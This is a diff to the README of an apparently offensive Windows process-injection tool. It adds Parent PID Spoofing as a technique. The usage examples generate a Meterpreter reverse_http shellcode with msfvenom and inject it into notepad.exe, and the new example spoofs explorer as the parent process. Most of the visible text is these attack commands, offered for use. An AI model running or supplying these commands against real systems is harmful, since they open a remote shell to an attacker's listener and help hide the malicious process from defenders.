@@ -8,8 +8,9 @@ Currently the tool supports 3 process injection techniques.
 	1) Vanila Process Injection
 	2) DLL Injection
 	3) Process Hollowing
+	4) Parent PID Spoofing
 
-Vanila Process Injection and Process Hollowing
+Vanila Process Injection, Process Hollowing and Parent PID Spoofing
 Currently the program accepts shellcode in 3 formats 
 
 	1) base64
@@ -39,6 +40,11 @@ Currently the program accepts shellcode in 3 formats
 	Generating shellcode in c format and injecting it in the target process.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
+	
+	Parent PID Spoofing
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
+	ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
 
 
 ### Blog Post
